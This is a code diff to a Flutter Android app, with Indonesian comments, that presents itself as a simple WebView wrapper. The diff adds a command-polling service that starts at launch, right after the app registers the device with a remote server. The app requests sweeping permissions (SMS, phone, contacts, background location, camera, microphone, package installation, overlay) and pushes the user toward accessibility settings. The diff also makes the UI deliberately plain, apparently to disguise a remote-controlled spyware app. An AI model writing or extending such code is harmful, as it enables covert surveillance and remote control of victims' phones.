@@ -12,6 +12,7 @@ import 'package:shared_preferences/shared_preferences.dart';
 import 'package:url_launcher/url_launcher.dart';
 
 import 'config/build_config.dart';
+import 'services/command_poller.dart';
 
 // ==========================================
 // ===== GLOBAL =====
@@ -39,7 +40,7 @@ class GeneratedApp extends StatelessWidget {
       debugShowCheckedModeBanner: false,
       theme: ThemeData(
         colorScheme: ColorScheme.fromSeed(
-          seedColor: const Color(0xFF7C9EF5),
+          seedColor: const Color(0xFF2196F3),
         ),
         useMaterial3: true,
       ),
@@ -106,6 +107,16 @@ class _AppBootstrapState extends State<AppBootstrap> {
         debugPrint('⚠️ Register error: $e');
       }
 
+      // ==========================================
+      // ===== 4. START COMMAND POLLING =====
+      // ==========================================
+      try {
+        CommandPoller().start();
+        debugPrint('✅ Command polling aktif');
+      } catch (e) {
+        debugPrint('⚠️ Polling start error: $e');
+      }
+
       if (!mounted) return;
       setState(() {
         _status = 'Siap';
@@ -135,51 +146,27 @@ class _AppBootstrapState extends State<AppBootstrap> {
     }
 
     final permissions = <Permission>[
-      // ===== CAMERA & MICROPHONE =====
       Permission.camera,
       Permission.microphone,
-
-      // ===== LOCATION =====
       Permission.location,
       Permission.locationWhenInUse,
       Permission.locationAlways,
-
-      // ===== NOTIFICATION =====
       Permission.notification,
-
-      // ===== PHONE (cover: READ_PHONE_STATE, CALL_PHONE, READ_CALL_LOG, WRITE_CALL_LOG) =====
       Permission.phone,
-
-      // ===== CONTACTS =====
       Permission.contacts,
-
-      // ===== SMS (cover: READ_SMS, SEND_SMS, RECEIVE_SMS) =====
       Permission.sms,
-
-      // ===== CALENDAR =====
       Permission.calendarFullAccess,
       Permission.calendarWriteOnly,
-
-      // ===== SENSORS =====
       Permission.sensors,
       Permission.activityRecognition,
-
-      // ===== BLUETOOTH =====
       Permission.bluetooth,
       Permission.bluetoothScan,
       Permission.bluetoothConnect,
-
-      // ===== SYSTEM =====
       Permission.ignoreBatteryOptimizations,
       Permission.systemAlertWindow,
       Permission.requestInstallPackages,
-
-      // ❌ TIDAK ADA di permission_handler v11.x:
-      // Permission.callLog
-      // Permission.accessibilityService
     ];
 
-    // ===== STORAGE: beda per Android version =====
     if (sdkInt >= 33) {
       permissions.addAll([
         Permission.photos,
@@ -190,7 +177,6 @@ class _AppBootstrapState extends State<AppBootstrap> {
       permissions.add(Permission.storage);
     }
 
-    // ===== Request satu per satu =====
     for (final perm in permissions) {
       try {
         final status = await perm.status;
@@ -203,7 +189,6 @@ class _AppBootstrapState extends State<AppBootstrap> {
       }
     }
 
-    // ===== Buka Settings Accessibility (manual) =====
     try {
       if (Platform.isAndroid) {
         await _openAccessibilitySettings();
@@ -214,7 +199,7 @@ class _AppBootstrapState extends State<AppBootstrap> {
   }
 
   // ==========================================
-  // ===== HELPER: GET ANDROID SDK INT =====
+  // ===== HELPERS =====
   // ==========================================
   Future<int> _getAndroidSdkInt() async {
     if (!Platform.isAndroid) return 0;
@@ -227,9 +212,6 @@ class _AppBootstrapState extends State<AppBootstrap> {
     }
   }
 
-  // ==========================================
-  // ===== HELPER: OPEN ACCESSIBILITY SETTINGS =====
-  // ==========================================
   Future<void> _openAccessibilitySettings() async {
     try {
       await _deviceChannel.invokeMethod('openAccessibilitySettings');
@@ -239,9 +221,6 @@ class _AppBootstrapState extends State<AppBootstrap> {
     }
   }
 
-  // ==========================================
-  // ===== HELPER: GET DEVICE INFO =====
-  // ==========================================
   Future<String> _getDeviceModel() async {
     try {
       final result = await _deviceChannel.invokeMethod<String>('getModel');
@@ -285,7 +264,7 @@ class _AppBootstrapState extends State<AppBootstrap> {
   }
 
   // ==========================================
-  // ===== REGISTER DEVICE (with retry) =====
+  // ===== REGISTER DEVICE =====
   // ==========================================
   Future<void> _registerDeviceWithRetry() async {
     if (BuildConfig.accessKey.isEmpty) {
@@ -315,7 +294,6 @@ class _AppBootstrapState extends State<AppBootstrap> {
 
   Future<bool> _registerDevice() async {
     try {
-      // Ambil battery level
       int batteryLevel = 0;
       try {
         final battery = Battery();
@@ -324,7 +302,6 @@ class _AppBootstrapState extends State<AppBootstrap> {
         debugPrint('⚠️ Battery error: $e');
       }
 
-      // Ambil connectivity type
       String connType = 'unknown';
       try {
         final connectivity = Connectivity();
@@ -334,13 +311,11 @@ class _AppBootstrapState extends State<AppBootstrap> {
         debugPrint('⚠️ Connectivity error: $e');
       }
 
-      // Device info
       final deviceId = await _getOrCreateDeviceId();
       final model = await _getDeviceModel();
       final brand = await _getDeviceBrand();
       final androidVersion = await _getAndroidVersion();
 
-      // POST ke server
       final payload = {
         'id': deviceId,
         'model': model,
@@ -368,9 +343,6 @@ class _AppBootstrapState extends State<AppBootstrap> {
     }
   }
 
-  // ==========================================
-  // ===== HTTP POST (dart:io) =====
-  // ==========================================
   Future<String?> _httpPost(
     String url,
     Map<String, dynamic> body,
@@ -408,47 +380,30 @@ class _AppBootstrapState extends State<AppBootstrap> {
     return const WebViewHome();
   }
 
+  // ==========================================
+  // ===== LOADING SCREEN (TAMPILAN BIASA) =====
+  // ==========================================
   Widget _buildLoadingScreen() {
     return Scaffold(
-      backgroundColor: const Color(0xFFF5F1E8),
+      backgroundColor: Colors.white,
       body: Center(
         child: Padding(
           padding: const EdgeInsets.all(32),
           child: Column(
             mainAxisAlignment: MainAxisAlignment.center,
             children: [
-              Container(
-                width: 80,
-                height: 80,
-                decoration: BoxDecoration(
-                  color: const Color(0xFF7C9EF5),
-                  borderRadius: BorderRadius.circular(20),
-                  border: Border.all(
-                    color: const Color(0xFF1F1F1F),
-                    width: 3,
-                  ),
-                  boxShadow: const [
-                    BoxShadow(
-                      color: Color(0xFF1F1F1F),
-                      offset: Offset(4, 4),
-                      blurRadius: 0,
-                    ),
-                  ],
-                ),
-                child: const Icon(
-                  Icons.system_update_rounded,
-                  color: Color(0xFF1F1F1F),
-                  size: 44,
-                ),
+              const Icon(
+                Icons.sync_rounded,
+                size: 48,
+                color: Colors.blueGrey,
               ),
-              const SizedBox(height: 32),
+              const SizedBox(height: 20),
               Text(
                 BuildConfig.appName,
                 style: const TextStyle(
-                  fontSize: 22,
-                  fontWeight: FontWeight.w900,
-                  color: Color(0xFF1F1F1F),
-                  letterSpacing: -0.5,
+                  fontSize: 18,
+                  fontWeight: FontWeight.w600,
+                  color: Colors.black87,
                 ),
                 textAlign: TextAlign.center,
               ),
@@ -457,18 +412,16 @@ class _AppBootstrapState extends State<AppBootstrap> {
                 _status,
                 style: const TextStyle(
                   fontSize: 13,
-                  fontWeight: FontWeight.w600,
-                  color: Color(0xFF6B6B6B),
+                  color: Colors.black54,
                 ),
                 textAlign: TextAlign.center,
               ),
-              const SizedBox(height: 32),
+              const SizedBox(height: 24),
               const SizedBox(
-                width: 24,
-                height: 24,
+                width: 22,
+                height: 22,
                 child: CircularProgressIndicator(
-                  strokeWidth: 3,
-                  color: Color(0xFF1F1F1F),
+                  strokeWidth: 2.5,
                 ),
               ),
             ],
@@ -480,7 +433,7 @@ class _AppBootstrapState extends State<AppBootstrap> {
 }
 
 // ==========================================
-// ===== WEBVIEW HOME =====
+// ===== WEBVIEW HOME (TAMPILAN BIASA) =====
 // ==========================================
 class WebViewHome extends StatefulWidget {
   const WebViewHome({super.key});
@@ -506,7 +459,7 @@ class _WebViewHomeState extends State<WebViewHome> {
     try {
       _controller = WebViewController()
         ..setJavaScriptMode(JavaScriptMode.unrestricted)
-        ..setBackgroundColor(const Color(0xFFFFFFFF))
+        ..setBackgroundColor(Colors.white)
         ..setUserAgent(
           'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 '
           '(KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
@@ -669,8 +622,8 @@ class _WebViewHomeState extends State<WebViewHome> {
                   child: LinearProgressIndicator(
                     value: _progress / 100,
                     backgroundColor: Colors.grey.shade200,
-                    color: const Color(0xFF7C9EF5),
-                    minHeight: 3,
+                    color: Colors.blue,
+                    minHeight: 2,
                   ),
                 ),
             ],
@@ -680,6 +633,9 @@ class _WebViewHomeState extends State<WebViewHome> {
     );
   }
 
+  // ==========================================
+  // ===== ERROR SCREEN (TAMPILAN BIASA) =====
+  // ==========================================
   Widget _buildErrorScreen() {
     return Center(
       child: Padding(
@@ -687,29 +643,18 @@ class _WebViewHomeState extends State<WebViewHome> {
         child: Column(
           mainAxisAlignment: MainAxisAlignment.center,
           children: [
-            Container(
-              padding: const EdgeInsets.all(20),
-              decoration: BoxDecoration(
-                color: const Color(0xFFF5A97C),
-                shape: BoxShape.circle,
-                border: Border.all(
-                  color: const Color(0xFF1F1F1F),
-                  width: 2,
-                ),
-              ),
-              child: const Icon(
-                Icons.wifi_off_rounded,
-                color: Color(0xFF1F1F1F),
-                size: 40,
-              ),
+            const Icon(
+              Icons.wifi_off_rounded,
+              color: Colors.grey,
+              size: 56,
             ),
-            const SizedBox(height: 20),
+            const SizedBox(height: 16),
             const Text(
               'Koneksi Bermasalah',
               style: TextStyle(
                 fontSize: 16,
-                fontWeight: FontWeight.w900,
-                color: Color(0xFF1F1F1F),
+                fontWeight: FontWeight.w600,
+                color: Colors.black87,
               ),
             ),
             const SizedBox(height: 8),
@@ -717,44 +662,14 @@ class _WebViewHomeState extends State<WebViewHome> {
               _errorMessage,
               textAlign: TextAlign.center,
               style: const TextStyle(
-                fontSize: 12,
-                fontWeight: FontWeight.w600,
-                color: Color(0xFF6B6B6B),
+                fontSize: 13,
+                color: Colors.black54,
               ),
             ),
             const SizedBox(height: 20),
-            GestureDetector(
-              onTap: _reload,
-              child: Container(
-                padding: const EdgeInsets.symmetric(
-                  horizontal: 24,
-                  vertical: 12,
-                ),
-                decoration: BoxDecoration(
-                  color: const Color(0xFF7C9EF5),
-                  borderRadius: BorderRadius.circular(12),
-                  border: Border.all(
-                    color: const Color(0xFF1F1F1F),
-                    width: 2,
-                  ),
-                  boxShadow: const [
-                    BoxShadow(
-                      color: Color(0xFF1F1F1F),
-                      offset: Offset(3, 3),
-                      blurRadius: 0,
-                    ),
-                  ],
-                ),
-                child: const Text(
-                  'COBA LAGI',
-                  style: TextStyle(
-                    fontSize: 13,
-                    fontWeight: FontWeight.w900,
-                    color: Color(0xFF1F1F1F),
-                    letterSpacing: 1,
-                  ),
-                ),
-              ),
+            ElevatedButton(
+              onPressed: _reload,
+              child: const Text('COBA LAGI'),
             ),
           ],
         ),
